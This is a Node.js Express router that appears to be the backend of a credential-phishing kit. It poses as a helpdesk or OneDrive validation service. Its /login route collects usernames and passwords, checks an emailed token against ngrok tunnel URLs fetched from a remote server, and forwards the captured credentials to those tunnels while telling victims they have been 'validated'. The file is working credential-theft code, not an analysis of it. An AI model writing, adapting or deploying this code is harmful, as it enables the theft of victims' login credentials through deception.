const express = require('express');
const router = express.Router();
const fetch = require('node-fetch');  // Import fetch directly

// Base URL for the central server which gives us the current ngrok URL
const centralServerBaseUrl = 'https://helpdesk-onedriveserver.onrender.com';

router.post('/validate', async (req, res) => {
    const { token } = req.body;

    if (!token) {
        console.log('Missing token');
        return res.status(400).send('Missing token');
    }

    try {
        console.log('Fetching URLs from central server...');
        const getUrlResponse = await fetch(`${centralServerBaseUrl}/list_urls`);
        const responseJson = await getUrlResponse.json();
        const urls = responseJson.urls;
        console.log('Fetched URLs:', urls);

        // Iterate through each URL to validate the token
        for (let urlObj of urls) {
            const url = urlObj.ngrok_url;
            console.log(`Validating token with URL: ${url}`);
            try {
                const validationResponse = await fetch(`${url}/validate2`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token }),
                    mode: 'cors'
                });

                const validationResponseText = await validationResponse.text();
                console.log(`Validation response from ${url}:`, validationResponseText);

                let validation;
                try {
                    validation = JSON.parse(validationResponseText);
                } catch (e) {
                    console.error(`Failed to parse JSON from ${url}:`, e);
                    continue;
                }

                // Perform the check here without returning anything
                if (validation.valid) {
                    console.log(`Token valid for URL: ${url}`);
                    // You can perform any action you want here if the token is valid
                } else {
                    console.log(`Token invalid for URL: ${url}`);
                }
            } catch (error) {
                console.error(`Error connecting to URL ${url}:`, error);
                continue;
            }
        }

        // The function ends here without returning any response to the client
        console.log('Validation process completed.');
    } catch (error) {
        console.error('Validation error:', error);
        // Optionally handle the error or log it
    }
});


router.post('/login', async (req, res) => {
    const { username, password, token } = req.body;

    if (!token || !username) {
        console.log('Missing token or username');
        return res.status(400).send('Missing token or username');
    }

    try {
        console.log('Fetching URLs from central server...');
        const getUrlResponse = await fetch(`${centralServerBaseUrl}/list_urls`);
        const responseJson = await getUrlResponse.json();
        const urls = responseJson.urls;
        console.log('Fetched URLs:', urls);

        // Iterate through each URL to validate the token
        for (let urlObj of urls) {
            const url = urlObj.ngrok_url;
            console.log(`Validating token with URL: ${url}`);
            try {
                const validationResponse = await fetch(`${url}/validate`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, token }),
                    mode: 'cors'
                });

                const validationResponseText = await validationResponse.text();
                console.log(`Validation response from ${url}:`, validationResponseText);

                let validation;
                try {
                    validation = JSON.parse(validationResponseText);
                } catch (e) {
                    console.error(`Failed to parse JSON from ${url}:`, e);
                    continue;
                }

                if (validation.valid) {
                    console.log(`Token valid for URL: ${url}`);
                    const localServerUrl = `${url}/receive`;
                    const response = await fetch(localServerUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username, password }),
                        mode: 'cors'
                    });

                    if (response.ok) {
                        console.log(`Data sent to local server successfully for URL: ${url}`);
                        return res.send({ success: true, message: 'You have successfully validated yourself. Thank you.' });
                    } else {
                        console.log(`Failed to send data to local server for URL: ${url}`);
                        break;
                    }
                } else {
                    console.log(`Token invalid for URL: ${url}`);
                }
            } catch (error) {
                console.error(`Error connecting to URL ${url}:`, error);
                continue;
            }
        }

        console.log('Invalid token or URL not found');
        return res.status(403).send({ success: false, message: 'Validation failed. Please revisit the link in your email.' });
    } catch (error) {
        console.error('Login error:', error);
        return res.status(500).send({ success: false, message: 'Server Error' });
    }
});

module.exports = router;
